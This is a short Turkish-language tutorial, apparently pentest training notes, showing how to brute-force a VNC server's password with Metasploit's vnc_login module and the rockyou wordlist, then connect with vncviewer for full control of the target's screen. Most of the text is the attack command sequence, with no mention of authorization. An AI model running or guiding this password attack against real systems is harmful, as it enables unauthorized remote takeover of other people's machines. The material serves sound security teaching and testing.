Metasploit Framework, VNC servisinde parola denemek için bir brute force modülü barındırır.  

---

## 🔍 Modül Arama
```bash
search vnc
```
- Birçok VNC modülü listelenir.  
- Bizim için uygun olan:  
```bash
use auxiliary/scanner/vnc/vnc_login
```

---

## ⚙️ Modül Konfigürasyonu
Mevcut seçenekleri görmek için:  
```bash
show options
```

**Önemli parametreler:**
- `RHOSTS` → Hedef IP  
- `PASSWORD` → Belirli parola  
- `PASS_FILE` → Parola wordlisti  

**Örnek ayarlar:**
```bash
set RHOSTS <hedef ip>
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

---

## 🚀 Saldırıyı Başlatmak
```bash
exploit
```

- Araç, wordlist’teki parolaları tek tek dener.  
- Doğru parola bulunduğunda ekrana yansır.  

---

## 📂 Hedef Makineye Bağlanmak
Doğru parolayı elde ettikten sonra terminalden:  
```bash
vncviewer <hedef ip>
```
- Bağlantı esnasında parola istenir.  
- Doğru parola girildiğinde **hedef makinenin ekranına erişim sağlanır**.  

✅ Böylece VNC üzerinden tam kontrol elde edilir.  
